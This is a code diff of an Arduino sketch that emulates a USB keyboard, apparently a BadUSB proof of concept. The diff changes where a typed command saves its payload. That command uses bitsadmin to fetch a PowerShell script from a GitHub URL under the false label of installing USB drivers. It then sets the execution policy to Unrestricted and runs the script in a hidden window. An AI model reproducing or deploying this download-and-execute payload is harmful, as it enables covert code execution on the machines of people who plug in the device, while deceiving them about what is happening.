@@ -15,12 +15,11 @@ void setup() {
   delay(100);
   Keyboard.releaseAll();
   
-  Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" %TEMP%/poc.ps1 && echo Instalando Drivers: && powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -file \"%TEMP%/poc.ps1\" ");
+  Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"C:/SOFT_FIRMA/poc.ps1\" && echo Instalando Drivers: && powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -file \"C:/SOFT_FIRMA/poc.ps1\" ");
   delay(2000);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
 
 }
-
 void loop() {
 }
